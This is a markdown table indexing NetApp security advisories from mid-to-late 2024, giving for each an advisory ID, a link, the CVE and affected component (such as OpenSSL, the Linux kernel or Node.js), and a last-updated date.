| [**NTAP-20241004-0006**](https://security.netapp.com/advisory/ntap-20241004-0006/) | CVE-2023-39333 Node.js Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20241004-0004**](https://security.netapp.com/advisory/ntap-20241004-0004/) | CVE-2024-24791 Golang Vulnerability in NetApp Products | 2024-10-14 |
| [**NTAP-20241004-0003**](https://security.netapp.com/advisory/ntap-20241004-0003/) | CVE-2024-34158 Golang Vulnerability in NetApp Products | 2024-10-14 |
| [**NTAP-20241004-0002**](https://security.netapp.com/advisory/ntap-20241004-0002/) | CVE-2024-36946 Linux Kernel Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20241004-0008**](https://security.netapp.com/advisory/ntap-20241004-0008/) | CVE-2024-43802 Vim Vulnerability in NetApp Products | 2024-10-14 |
| [**NTAP-20241004-0007**](https://security.netapp.com/advisory/ntap-20241004-0007/) | CVE-2024-45306 Vim Vulnerability in NetApp Products | 2024-10-14 |
| [**NTAP-20241004-0001**](https://security.netapp.com/advisory/ntap-20241004-0001/) | CVE-2024-6383 MongoDB Vulnerability in NetApp Products | 2024-10-04 |
| [**NTAP-20240926-0007**](https://security.netapp.com/advisory/ntap-20240926-0007/) | CVE-2023-30582 Node.js Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20240926-0006**](https://security.netapp.com/advisory/ntap-20240926-0006/) | CVE-2023-30583 Node.js Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20240926-0001**](https://security.netapp.com/advisory/ntap-20240926-0001/) | CVE-2024-27399 Linux Kernel Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20240926-0005**](https://security.netapp.com/advisory/ntap-20240926-0005/) | CVE-2024-34155 Golang Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240926-0004**](https://security.netapp.com/advisory/ntap-20240926-0004/) | CVE-2024-34156 Golang Vulnerability in NetApp Products | 2024-12-04 |
| [**NTAP-20240926-0002**](https://security.netapp.com/advisory/ntap-20240926-0002/) | CVE-2024-36902 Linux Kernel Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20240926-0009**](https://security.netapp.com/advisory/ntap-20240926-0009/) | CVE-2024-41721 FreeBSD Vulnerability in NetApp Products | 2024-09-26 |
| [**NTAP-20240926-0010**](https://security.netapp.com/advisory/ntap-20240926-0010/) | CVE-2024-45287 FreeBSD Vulnerability in NetApp Products | 2024-12-04 |
| [**NTAP-20240926-0008**](https://security.netapp.com/advisory/ntap-20240926-0008/) | CVE-2024-45409 Ruby SAML Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20240926-0003**](https://security.netapp.com/advisory/ntap-20240926-0003/) | CVE-2024-6923 Python Vulnerability in NetApp Products | 2024-11-29 |
| [**NTAP-20240920-0007**](https://security.netapp.com/advisory/ntap-20240920-0007/) | CVE-2024-32668 FreeBSD Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240920-0002**](https://security.netapp.com/advisory/ntap-20240920-0002/) | CVE-2024-38808 Spring Framework Vulnerability in NetApp Products | 2025-01-06 |
| [**NTAP-20240920-0003**](https://security.netapp.com/advisory/ntap-20240920-0003/) | CVE-2024-38809 Spring Framework Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20240920-0009**](https://security.netapp.com/advisory/ntap-20240920-0009/) | CVE-2024-41928 FreeBSD Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240920-0004**](https://security.netapp.com/advisory/ntap-20240920-0004/) | CVE-2024-43374 Vim Vulnerability in NetApp Products | 2024-10-14 |
| [**NTAP-20240920-0005**](https://security.netapp.com/advisory/ntap-20240920-0005/) | CVE-2024-43790 Vim Vulnerability in NetApp Products | 2024-10-14 |
| [**NTAP-20240920-0008**](https://security.netapp.com/advisory/ntap-20240920-0008/) | CVE-2024-45288 FreeBSD Vulnerability in NetApp Products | 2024-12-04 |
| [**NTAP-20240920-0001**](https://security.netapp.com/advisory/ntap-20240920-0001/) | CVE-2024-7006 LibTIFF Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20240920-0006**](https://security.netapp.com/advisory/ntap-20240920-0006/) | CVE-2024-8235 Libvirt Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240920-0010**](https://security.netapp.com/advisory/ntap-20240920-0010/) | September 2024 FreeBSD ctl Vulnerabilities in NetApp Products | 2024-09-20 |
| [**NTAP-20240916-0001**](https://security.netapp.com/advisory/ntap-20240916-0001/) | CVE-2024-43102 FreeBSD Vulnerability in NetApp Products | 2024-09-24 |
| [**NTAP-20240912-0003**](https://security.netapp.com/advisory/ntap-20240912-0003/) | August 2024 IBM DB2 Vulnerabilities in NetApp Products | 2024-09-12 |
| [**NTAP-20240912-0008**](https://security.netapp.com/advisory/ntap-20240912-0008/) | CVE-2022-48655 Linux Kernel Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20240912-0002**](https://security.netapp.com/advisory/ntap-20240912-0002/) | CVE-2023-37920 Certifi Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20240912-0009**](https://security.netapp.com/advisory/ntap-20240912-0009/) | CVE-2023-52585 Linux Kernel Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20240912-0010**](https://security.netapp.com/advisory/ntap-20240912-0010/) | CVE-2023-52882 Linux Kernel Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20240912-0011**](https://security.netapp.com/advisory/ntap-20240912-0011/) | CVE-2024-26900 Linux Kernel Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20240912-0012**](https://security.netapp.com/advisory/ntap-20240912-0012/) | CVE-2024-27398 Linux Kernel Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20240912-0006**](https://security.netapp.com/advisory/ntap-20240912-0006/) | CVE-2024-36933 Linux Kernel Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20240912-0007**](https://security.netapp.com/advisory/ntap-20240912-0007/) | CVE-2024-36934 Linux Kernel Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20240912-0001**](https://security.netapp.com/advisory/ntap-20240912-0001/) | CVE-2024-6119 OpenSSL Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20240912-0004**](https://security.netapp.com/advisory/ntap-20240912-0004/) | Intel SA-00923 CSME Vulnerabilities in NetApp Products | 2024-09-12 |
| [**NTAP-20240912-0005**](https://security.netapp.com/advisory/ntap-20240912-0005/) | June 2024 IBM DB2 Vulnerabilities in NetApp Products | 2024-09-12 |
| [**NTAP-20240905-0008**](https://security.netapp.com/advisory/ntap-20240905-0008/) | April 2024 Node.js Vulnerabilities in NetApp Products | 2024-11-22 |
| [**NTAP-20240905-0007**](https://security.netapp.com/advisory/ntap-20240905-0007/) | August 2024 Django Vulnerabilities in NetApp Products | 2024-09-05 |
| [**NTAP-20240905-0002**](https://security.netapp.com/advisory/ntap-20240905-0002/) | CVE-2024-24790 Golang Vulnerability in NetApp Products | 2024-09-26 |
| [**NTAP-20240905-0004**](https://security.netapp.com/advisory/ntap-20240905-0004/) | CVE-2024-36904 Linux Kernel Vulnerability in NetApp Products | 2025-01-06 |
| [**NTAP-20240905-0005**](https://security.netapp.com/advisory/ntap-20240905-0005/) | CVE-2024-36905 Linux Kernel Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20240905-0006**](https://security.netapp.com/advisory/ntap-20240905-0006/) | CVE-2024-36916 Linux Kernel Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20240905-0009**](https://security.netapp.com/advisory/ntap-20240905-0009/) | CVE-2024-36919 Linux Kernel Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20240905-0010**](https://security.netapp.com/advisory/ntap-20240905-0010/) | CVE-2024-36929 Linux Kernel Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20240905-0001**](https://security.netapp.com/advisory/ntap-20240905-0001/) | CVE-2024-38517 RapidJSON Vulnerability in NetApp Products | 2024-09-30 |
| [**NTAP-20240905-0003**](https://security.netapp.com/advisory/ntap-20240905-0003/) | CVE-2024-39684 RapidJSON Vulnerability in NetApp Products | 2024-09-05 |
| [**NTAP-20240828-0004**](https://security.netapp.com/advisory/ntap-20240828-0004/) | CVE-2023-29267 IBM Db2 Vulnerability in NetApp Products | 2024-08-28 |
| [**NTAP-20240828-0005**](https://security.netapp.com/advisory/ntap-20240828-0005/) | CVE-2023-43491 QEMU Vulnerability in NetApp Products | 2024-08-28 |
| [**NTAP-20240828-0006**](https://security.netapp.com/advisory/ntap-20240828-0006/) | CVE-2023-45744 QEMU Vulnerability in NetApp Products | 2024-08-28 |
| [**NTAP-20240828-0003**](https://security.netapp.com/advisory/ntap-20240828-0003/) | CVE-2023-52433 Linux Kernel Vulnerability in NetApp Products | 2024-11-05 |
| [**NTAP-20240828-0002**](https://security.netapp.com/advisory/ntap-20240828-0002/) | CVE-2024-3653 Undertow Vulnerability in NetApp Products | 2024-09-26 |
| [**NTAP-20240828-0009**](https://security.netapp.com/advisory/ntap-20240828-0009/) | CVE-2024-38372 Node.js Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20240828-0010**](https://security.netapp.com/advisory/ntap-20240828-0010/) | CVE-2024-42154 Linux Kernel Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20240828-0007**](https://security.netapp.com/advisory/ntap-20240828-0007/) | CVE-2024-4693 QEMU Vulnerability in NetApp Products | 2024-08-28 |
| [**NTAP-20240828-0001**](https://security.netapp.com/advisory/ntap-20240828-0001/) | CVE-2024-5971 Undertow Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20240828-0008**](https://security.netapp.com/advisory/ntap-20240828-0008/) | CVE-2024-7264 curl Vulnerability in NetApp Products | 2025-01-06 |
| [**NTAP-20240822-0008**](https://security.netapp.com/advisory/ntap-20240822-0008/) | CVE-2023-40146 QEMU Vulnerability in NetApp Products | 2024-08-22 |
| [**NTAP-20240822-0009**](https://security.netapp.com/advisory/ntap-20240822-0009/) | CVE-2024-29953 Brocade Fabric OS Information Disclosure Vulnerability | 2024-08-22 |
| [**NTAP-20240822-0010**](https://security.netapp.com/advisory/ntap-20240822-0010/) | CVE-2024-29954 Brocade Fabric OS Information Disclosure Vulnerability | 2024-08-22 |
| [**NTAP-20240822-0006**](https://security.netapp.com/advisory/ntap-20240822-0006/) | CVE-2024-31870 IBM Db2 Vulnerability in NetApp Products | 2024-08-22 |
| [**NTAP-20240822-0007**](https://security.netapp.com/advisory/ntap-20240822-0007/) | CVE-2024-3567 QEMU Vulnerability in NetApp Products | 2024-08-22 |
| [**NTAP-20240822-0001**](https://security.netapp.com/advisory/ntap-20240822-0001/) | CVE-2024-3596 RADIUS Protocol Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20240822-0003**](https://security.netapp.com/advisory/ntap-20240822-0003/) | CVE-2024-37891 urllib3 Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240822-0005**](https://security.netapp.com/advisory/ntap-20240822-0005/) | CVE-2024-4467 QEMU Vulnerability in NetApp Products | 2024-08-22 |
| [**NTAP-20240822-0004**](https://security.netapp.com/advisory/ntap-20240822-0004/) | CVE-2024-6874 curl Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20240822-0002**](https://security.netapp.com/advisory/ntap-20240822-0002/) | CVE-2024-7348 PostgreSQL Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20240816-0001**](https://security.netapp.com/advisory/ntap-20240816-0001/) | CVE-2018-19788 PolicyKit Vulnerability in NetApp Products | 2024-09-12 |
| [**NTAP-20240816-0005**](https://security.netapp.com/advisory/ntap-20240816-0005/) | CVE-2023-52340 Linux Kernel Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20240816-0007**](https://security.netapp.com/advisory/ntap-20240816-0007/) | CVE-2024-22018 Node.js Vulnerability in NetApp Products | 2024-08-16 |
| [**NTAP-20240816-0004**](https://security.netapp.com/advisory/ntap-20240816-0004/) | CVE-2024-34750 Apache Tomcat Vulnerability in NetApp Products | 2024-11-05 |
| [**NTAP-20240816-0003**](https://security.netapp.com/advisory/ntap-20240816-0003/) | CVE-2024-37280 Elasticsearch Vulnerability in NetApp Products | 2024-08-16 |
| [**NTAP-20240816-0006**](https://security.netapp.com/advisory/ntap-20240816-0006/) | CVE-2024-6505 QEMU Vulnerability in NetApp Products | 2024-08-16 |
| [**NTAP-20240816-0008**](https://security.netapp.com/advisory/ntap-20240816-0008/) | CVE-2024-6640 FreeBSD Vulnerability in NetApp Products | 2024-09-12 |
| [**NTAP-20240816-0009**](https://security.netapp.com/advisory/ntap-20240816-0009/) | CVE-2024-6759 FreeBSD Vulnerability in NetApp Products | 2024-10-18 |
| [**NTAP-20240816-0010**](https://security.netapp.com/advisory/ntap-20240816-0010/) | CVE-2024-6760 FreeBSD Vulnerability in NetApp Products | 2024-10-14 |
| [**NTAP-20240816-0002**](https://security.netapp.com/advisory/ntap-20240816-0002/) | CVE-2024-7589 FreeBSD Vulnerability in NetApp Products | 2024-08-26 |
| [**NTAP-20240812-0001**](https://security.netapp.com/advisory/ntap-20240812-0001/) | CVE-2020-15999 Freetype Vulnerability in NetApp Products | 2024-08-12 |
| [**NTAP-20240808-0003**](https://security.netapp.com/advisory/ntap-20240808-0003/) | CVE-2021-23358 Node.js Vulnerability in NetApp Products | 2024-10-30 |
| [**NTAP-20240808-0004**](https://security.netapp.com/advisory/ntap-20240808-0004/) | CVE-2023-39333 Node.js Vulnerability in NetApp Products | 2024-08-08 |
| [**NTAP-20240808-0002**](https://security.netapp.com/advisory/ntap-20240808-0002/) | CVE-2023-46750 Apache Shiro Vulnerability in NetApp Products | 2024-10-30 |
| [**NTAP-20240808-0001**](https://security.netapp.com/advisory/ntap-20240808-0001/) | CVE-2024-0684 GNU Coreutils Vulnerability in NetApp Products | 2024-10-30 |
| [**NTAP-20240808-0009**](https://security.netapp.com/advisory/ntap-20240808-0009/) | CVE-2024-32007 Apache CXF Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20240808-0007**](https://security.netapp.com/advisory/ntap-20240808-0007/) | CVE-2024-40725 Apache HTTP Server Vulnerability in NetApp Products | 2025-01-06 |
| [**NTAP-20240808-0006**](https://security.netapp.com/advisory/ntap-20240808-0006/) | CVE-2024-40898 Apache HTTP Server Vulnerability in NetApp Products | 2025-01-06 |
| [**NTAP-20240808-0008**](https://security.netapp.com/advisory/ntap-20240808-0008/) | CVE-2024-41172 Apache CXF Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240808-0010**](https://security.netapp.com/advisory/ntap-20240808-0010/) | CVE-2024-6716 LibTIFF Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20240808-0005**](https://security.netapp.com/advisory/ntap-20240808-0005/) | July 2024 Django Vulnerabilities in NetApp Products | 2024-08-08 |
| [**NTAP-20240802-0001**](https://security.netapp.com/advisory/ntap-20240802-0001/) | CVE-2024-41110 Docker Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20240801-0002**](https://security.netapp.com/advisory/ntap-20240801-0002/) | July 2024 MySQL Server 8.0.36 and 8.3.0 Vulnerabilities in NetApp Products | 2024-12-06 |
| [**NTAP-20240801-0001**](https://security.netapp.com/advisory/ntap-20240801-0001/) | July 2024 MySQL Server 8.0.37 and 8.4.0 Vulnerabilities in NetApp Products | 2024-12-06 |
| [**NTAP-20240731-0004**](https://security.netapp.com/advisory/ntap-20240731-0004/) | CVE-2024-0760 ISC BIND Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20240731-0003**](https://security.netapp.com/advisory/ntap-20240731-0003/) | CVE-2024-1737 ISC BIND Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20240731-0002**](https://security.netapp.com/advisory/ntap-20240731-0002/) | CVE-2024-1975 ISC BIND Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20240731-0009**](https://security.netapp.com/advisory/ntap-20240731-0009/) | CVE-2024-21137 MySQL Server Vulnerability in NetApp Products | 2024-12-06 |
| [**NTAP-20240731-0008**](https://security.netapp.com/advisory/ntap-20240731-0008/) | CVE-2024-21157 MySQL Server Vulnerability in NetApp Products | 2024-12-06 |
| [**NTAP-20240731-0007**](https://security.netapp.com/advisory/ntap-20240731-0007/) | CVE-2024-21165 MySQL Server Vulnerability in NetApp Products | 2024-12-06 |
| [**NTAP-20240731-0006**](https://security.netapp.com/advisory/ntap-20240731-0006/) | CVE-2024-21176 MySQL Server Vulnerability in NetApp Products | 2024-12-06 |
| [**NTAP-20240731-0005**](https://security.netapp.com/advisory/ntap-20240731-0005/) | CVE-2024-21185 MySQL Server Vulnerability in NetApp Products | 2024-12-06 |
| [**NTAP-20240731-0001**](https://security.netapp.com/advisory/ntap-20240731-0001/) | CVE-2024-4076 ISC BIND Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20240726-0003**](https://security.netapp.com/advisory/ntap-20240726-0003/) | CVE-2018-14335 H2 Database Vulnerability in NetApp Products | 2024-10-30 |
| [**NTAP-20240726-0004**](https://security.netapp.com/advisory/ntap-20240726-0004/) | CVE-2024-4032 Python Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20240726-0001**](https://security.netapp.com/advisory/ntap-20240726-0001/) | CVE-2024-5458 PHP Vulnerability in NetApp Products | 2024-10-30 |
| [**NTAP-20240726-0002**](https://security.netapp.com/advisory/ntap-20240726-0002/) | CVE-2024-5585 PHP Vulnerability in NetApp Products | 2024-08-01 |
| [**NTAP-20240726-0005**](https://security.netapp.com/advisory/ntap-20240726-0005/) | CVE-2024-5642 Python Vulnerability in NetApp Products | 2024-09-30 |
| [**NTAP-20240719-0002**](https://security.netapp.com/advisory/ntap-20240719-0002/) | CVE-2014-9515 Dozer Vulnerability in NetApp Products | 2024-09-12 |
| [**NTAP-20240719-0005**](https://security.netapp.com/advisory/ntap-20240719-0005/) | CVE-2015-0973 Libpng Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20240719-0004**](https://security.netapp.com/advisory/ntap-20240719-0004/) | CVE-2016-3751 Libpng Vulnerability in NetApp Products | 2024-09-26 |
| [**NTAP-20240719-0003**](https://security.netapp.com/advisory/ntap-20240719-0003/) | CVE-2018-10054 H2 Database Vulnerability in NetApp Products | 2024-10-30 |
| [**NTAP-20240719-0006**](https://security.netapp.com/advisory/ntap-20240719-0006/) | CVE-2019-17626 ReportLab Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240719-0007**](https://security.netapp.com/advisory/ntap-20240719-0007/) | CVE-2024-21144 Java Platform Standard Edition Vulnerability in NetApp Products | 2024-12-04 |
| [**NTAP-20240719-0001**](https://security.netapp.com/advisory/ntap-20240719-0001/) | CVE-2024-37894 Squid Vulnerability in NetApp Products | 2024-08-01 |
| [**NTAP-20240719-0008**](https://security.netapp.com/advisory/ntap-20240719-0008/) | July 2024 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2024-12-06 |
| [**NTAP-20240712-0002**](https://security.netapp.com/advisory/ntap-20240712-0002/) | CVE-2024-39884 Apache HTTP Server Vulnerability in NetApp Products | 2025-01-06 |
| [**NTAP-20240712-0004**](https://security.netapp.com/advisory/ntap-20240712-0004/) | CVE-2024-39894 OpenSSH Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20240712-0005**](https://security.netapp.com/advisory/ntap-20240712-0005/) | CVE-2024-5535 OpenSSL Vulnerability in NetApp Products | 2024-11-29 |
| [**NTAP-20240712-0003**](https://security.netapp.com/advisory/ntap-20240712-0003/) | CVE-2024-6409 OpenSSH Vulnerability in NetApp Products | 2025-01-06 |
| [**NTAP-20240712-0001**](https://security.netapp.com/advisory/ntap-20240712-0001/) | July 2024 Apache HTTP Server Vulnerabilities in NetApp Products | 2024-12-20 |
| [**NTAP-20240705-0001**](https://security.netapp.com/advisory/ntap-20240705-0001/) | CVE-2022-1941 Protobuf-cpp & Protobuf-python Vulnerability in NetApp Products | 2024-07-05 |
| [**NTAP-20240705-0006**](https://security.netapp.com/advisory/ntap-20240705-0006/) | CVE-2024-1931 Unbound Vulnerability in NetApp Products | 2024-07-05 |
| [**NTAP-20240705-0007**](https://security.netapp.com/advisory/ntap-20240705-0007/) | CVE-2024-21993 Information Disclosure Vulnerability in SnapCenter | 2024-07-05 |
| [**NTAP-20240705-0002**](https://security.netapp.com/advisory/ntap-20240705-0002/) | CVE-2024-27309 Apache Kafka Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240705-0003**](https://security.netapp.com/advisory/ntap-20240705-0003/) | CVE-2024-32962 Node.js Vulnerability in NetApp Products | 2024-08-01 |
| [**NTAP-20240705-0004**](https://security.netapp.com/advisory/ntap-20240705-0004/) | CVE-2024-37051 JetBrains IDE Vulnerability | 2024-09-20 |
| [**NTAP-20240705-0005**](https://security.netapp.com/advisory/ntap-20240705-0005/) | CVE-2024-4030 Python Vulnerability in NetApp Products | 2024-10-24 |
| [**NTAP-20240701-0001**](https://security.netapp.com/advisory/ntap-20240701-0001/) | CVE-2024-6387 OpenSSH Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20240628-0001**](https://security.netapp.com/advisory/ntap-20240628-0001/) | CVE-2022-1227 Podman Vulnerability in NetApp Products | 2024-06-28 |
| [**NTAP-20240628-0004**](https://security.netapp.com/advisory/ntap-20240628-0004/) | CVE-2023-3454 Brocade Fabric OS Remote Code Execution Vulnerability | 2024-06-28 |
| [**NTAP-20240628-0006**](https://security.netapp.com/advisory/ntap-20240628-0006/) | CVE-2023-36665 Protobuf.js Vulnerability in NetApp Products | 2024-08-07 |
| [**NTAP-20240628-0005**](https://security.netapp.com/advisory/ntap-20240628-0005/) | CVE-2023-5973 Brocade Fabric OS Truncated Port Name Vulnerability | 2024-06-28 |
| [**NTAP-20240628-0002**](https://security.netapp.com/advisory/ntap-20240628-0002/) | CVE-2023-6240 Linux Kernel Vulnerability in NetApp Products | 2024-10-22 |
| [**NTAP-20240628-0003**](https://security.netapp.com/advisory/ntap-20240628-0003/) | CVE-2024-2859 Brocade SANnav Root User Login Enabled Vulnerability | 2024-06-28 |
| [**NTAP-20240621-0002**](https://security.netapp.com/advisory/ntap-20240621-0002/) | CVE-2022-3080 ISC BIND Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20240621-0008**](https://security.netapp.com/advisory/ntap-20240621-0008/) | CVE-2024-4577 PHP Vulnerability in NetApp Products | 2024-07-01 |
| [**NTAP-20240621-0001**](https://security.netapp.com/advisory/ntap-20240621-0001/) | CVE-2024-4603 OpenSSL Vulnerability in NetApp Products | 2024-12-04 |
| [**NTAP-20240621-0004**](https://security.netapp.com/advisory/ntap-20240621-0004/) | CVE-2024-4741 OpenSSL Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20240621-0006**](https://security.netapp.com/advisory/ntap-20240621-0006/) | February 2024 IBM Cognos Analytics Vulnerabilities in NetApp Products | 2024-09-20 |
| [**NTAP-20240621-0003**](https://security.netapp.com/advisory/ntap-20240621-0003/) | Intel SA-01036 Intel Trust Domain Extensions (TDX) Vulnerabilities in NetApp Products | 2024-07-26 |
| [**NTAP-20240621-0007**](https://security.netapp.com/advisory/ntap-20240621-0007/) | May 2024 IBM Cognos Analytics Vulnerabilities in NetApp Products | 2024-09-20 |
| [**NTAP-20240621-0005**](https://security.netapp.com/advisory/ntap-20240621-0005/) | September 2023 IBM Cognos Analytics Vulnerabilities in NetApp Products | 2024-09-20 |
| [**NTAP-20240614-0006**](https://security.netapp.com/advisory/ntap-20240614-0006/) | CVE-2022-4967 strongSwan Vulnerability in NetApp Products | 2024-07-02 |
| [**NTAP-20240614-0003**](https://security.netapp.com/advisory/ntap-20240614-0003/) | CVE-2023-52425 libexpat Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20240614-0009**](https://security.netapp.com/advisory/ntap-20240614-0009/) | CVE-2024-1086 Linux Kernel Vulnerability in NetApp Products | 2024-10-24 |
| [**NTAP-20240614-0010**](https://security.netapp.com/advisory/ntap-20240614-0010/) | CVE-2024-21988 SSH Cryptographic Implementation Vulnerability in StorageGRID (formerly StorageGRID Webscale) | 2024-06-14 |
| [**NTAP-20240614-0005**](https://security.netapp.com/advisory/ntap-20240614-0005/) | CVE-2024-22233 Spring Framework Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20240614-0002**](https://security.netapp.com/advisory/ntap-20240614-0002/) | CVE-2024-2877 HashiCorp Vault Vulnerability in NetApp Products | 2024-06-14 |
| [**NTAP-20240614-0008**](https://security.netapp.com/advisory/ntap-20240614-0008/) | CVE-2024-30171 Bouncy Castle Vulnerability in NetApp Products | 2024-08-21 |
| [**NTAP-20240614-0004**](https://security.netapp.com/advisory/ntap-20240614-0004/) | CVE-2024-34069 Werkzeug Vulnerability in NetApp Products | 2024-08-14 |
| [**NTAP-20240614-0007**](https://security.netapp.com/advisory/ntap-20240614-0007/) | May 2024 Bouncy Castle Vulnerabilities in NetApp Products | 2024-12-13 |
| [**NTAP-20240605-0010**](https://security.netapp.com/advisory/ntap-20240605-0010/) | CVE-2022-48624 less Vulnerability in NetApp Products | 2024-09-26 |
| [**NTAP-20240605-0006**](https://security.netapp.com/advisory/ntap-20240605-0006/) | CVE-2023-20569 Debian Vulnerability in NetApp Products | 2024-08-01 |
| [**NTAP-20240605-0007**](https://security.netapp.com/advisory/ntap-20240605-0007/) | CVE-2023-23913 Ruby on Rails Vulnerability in NetApp Products | 2024-06-05 |
| [**NTAP-20240605-0005**](https://security.netapp.com/advisory/ntap-20240605-0005/) | CVE-2023-31130 c-ares Vulnerability in NetApp Products | 2024-09-12 |
| [**NTAP-20240605-0004**](https://security.netapp.com/advisory/ntap-20240605-0004/) | CVE-2023-32067 c-ares Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20240605-0002**](https://security.netapp.com/advisory/ntap-20240605-0002/) | CVE-2024-24788 Golang Vulnerability in NetApp Products | 2024-07-19 |
| [**NTAP-20240605-0008**](https://security.netapp.com/advisory/ntap-20240605-0008/) | CVE-2024-24806 libuv Vulnerability in NetApp Products | 2024-12-06 |
| [**NTAP-20240605-0001**](https://security.netapp.com/advisory/ntap-20240605-0001/) | CVE-2024-25111 Squid Vulnerability in NetApp Products | 2024-12-06 |
| [**NTAP-20240605-0009**](https://security.netapp.com/advisory/ntap-20240605-0009/) | CVE-2024-32487 less Vulnerability in NetApp Products | 2024-09-26 |
| [**NTAP-20240605-0003**](https://security.netapp.com/advisory/ntap-20240605-0003/) | CVE-2024-33883 Node.js Vulnerability in NetApp Products | 2024-08-01 |
| [**NTAP-20240531-0005**](https://security.netapp.com/advisory/ntap-20240531-0005/) | CVE-2023-20588 Debian Vulnerability in NetApp Products | 2024-05-31 |
| [**NTAP-20240531-0004**](https://security.netapp.com/advisory/ntap-20240531-0004/) | CVE-2023-20593 Debian Vulnerability in NetApp Products | 2024-05-31 |
| [**NTAP-20240531-0007**](https://security.netapp.com/advisory/ntap-20240531-0007/) | CVE-2023-6237 OpenSSL Vulnerability in NetApp Products | 2024-11-29 |
| [**NTAP-20240531-0001**](https://security.netapp.com/advisory/ntap-20240531-0001/) | CVE-2024-2379 curl Vulnerability in NetApp Products | 2024-10-24 |
| [**NTAP-20240531-0006**](https://security.netapp.com/advisory/ntap-20240531-0006/) | CVE-2024-24787 Golang Vulnerability in NetApp Products | 2024-06-21 |
| [**NTAP-20240531-0003**](https://security.netapp.com/advisory/ntap-20240531-0003/) | CVE-2024-28085 Util-linux Vulnerability in NetApp Products | 2024-06-21 |
| [**NTAP-20240531-0002**](https://security.netapp.com/advisory/ntap-20240531-0002/) | CVE-2024-2961 GNU C Library (glibc) Vulnerability in NetApp Products | 2024-11-05 |
| [**NTAP-20240531-0008**](https://security.netapp.com/advisory/ntap-20240531-0008/) | CVE-2024-34397 Gnome Glib Vulnerability in NetApp Products | 2024-10-30 |
| [**NTAP-20240524-0015**](https://security.netapp.com/advisory/ntap-20240524-0015/) | CVE-2023-20863 Spring Security Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20240524-0008**](https://security.netapp.com/advisory/ntap-20240524-0008/) | CVE-2024-1313 Grafana Vulnerability in NetApp Products | 2024-05-24 |
| [**NTAP-20240524-0010**](https://security.netapp.com/advisory/ntap-20240524-0010/) | CVE-2024-1351 MongoDB Vulnerability in NetApp Products | 2024-06-18 |
| [**NTAP-20240524-0006**](https://security.netapp.com/advisory/ntap-20240524-0006/) | CVE-2024-2004 curl Vulnerability in NetApp Products | 2024-10-24 |
| [**NTAP-20240524-0009**](https://security.netapp.com/advisory/ntap-20240524-0009/) | CVE-2024-2048 HashiCorp Vault Vulnerability in NetApp Products | 2024-05-24 |
| [**NTAP-20240524-0001**](https://security.netapp.com/advisory/ntap-20240524-0001/) | CVE-2024-22243 Spring Framework Vulnerability in NetApp Products | 2024-08-23 |
| [**NTAP-20240524-0002**](https://security.netapp.com/advisory/ntap-20240524-0002/) | CVE-2024-22259 Spring Framework Vulnerability in NetApp Products | 2024-08-23 |
| [**NTAP-20240524-0003**](https://security.netapp.com/advisory/ntap-20240524-0003/) | CVE-2024-22262 Spring Framework Vulnerability in NetApp Products | 2024-09-20 |
| [**NTAP-20240524-0007**](https://security.netapp.com/advisory/ntap-20240524-0007/) | CVE-2024-2660 HashiCorp Vault Vulnerability in NetApp Products | 2024-05-24 |
| [**NTAP-20240524-0004**](https://security.netapp.com/advisory/ntap-20240524-0004/) | CVE-2024-28834 GNU TLS Vulnerability in NetApp Products | 2024-09-30 |
| [**NTAP-20240524-0005**](https://security.netapp.com/advisory/ntap-20240524-0005/) | CVE-2024-28863 Node.js Vulnerability in NetApp Products | 2024-09-20 |
